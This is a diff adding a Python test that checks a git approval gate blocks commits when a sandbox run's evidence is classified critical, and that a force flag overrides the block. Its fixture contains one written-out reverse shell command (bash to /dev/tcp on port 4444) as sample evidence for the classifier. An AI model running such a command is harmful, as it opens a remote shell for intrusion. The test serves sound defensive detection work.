@@ -149,6 +149,42 @@ async def test_commit_only_selected_paths(client):
     assert "?? b.txt" in porcelain  # untouched, still uncommitted
 
 
+async def test_push_blocked_on_critical_sandbox_run(client, tmp_env, monkeypatch):
+    import json as _json
+
+    monkeypatch.setattr(settings, "vm_dir", tmp_env / "vm")
+    cap = tmp_env / "vm" / "captures"
+    cap.mkdir(parents=True)
+    db = await get_db()
+    try:
+        async with db.execute("SELECT id FROM projects WHERE slug='demo'") as c:
+            pid = (await c.fetchone())["id"]
+        cur = await db.execute(
+            "INSERT INTO runs (project_id, status) VALUES (?, 'done')", (pid,))
+        run_id = cur.lastrowid
+        await db.commit()
+    finally:
+        await db.close()
+    # evidence that the deterministic classifier scores critical (reverse shell)
+    ev = {"execs": ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"], "flows": [],
+          "blocked": [], "dns": [], "sensitive": [], "staged": []}
+    (cap / f"gate-{run_id}-evidence.json").write_text(_json.dumps(ev))
+    v = await gitgate.latest_run_verdict("demo")
+    assert v and v["verdict"] == "crit"
+
+    (_pdir() / "a.txt").write_text("a")
+    row = await gitgate.create_request("demo", "Add a")
+    # unforced approval is blocked (403), and nothing is committed
+    r = await client.post(f"/api/projects/demo/git/requests/{row['id']}/approve")
+    assert r.status_code == 403 and "CRITICAL" in r.json()["detail"]
+    rc, _, _ = await gitgate.run_git("demo", "rev-parse", "--verify", "-q", "HEAD")
+    assert rc != 0
+    # force overrides the gate and commits
+    r = await client.post(
+        f"/api/projects/demo/git/requests/{row['id']}/approve?force=true")
+    assert r.status_code == 200 and r.json()["status"] == "approved"
+
+
 async def test_approve_pushes_when_remote_set(client, tmp_env):
     bare = tmp_env / "remote.git"
     subprocess.run(["git", "init", "-q", "--bare", str(bare)], check=True)
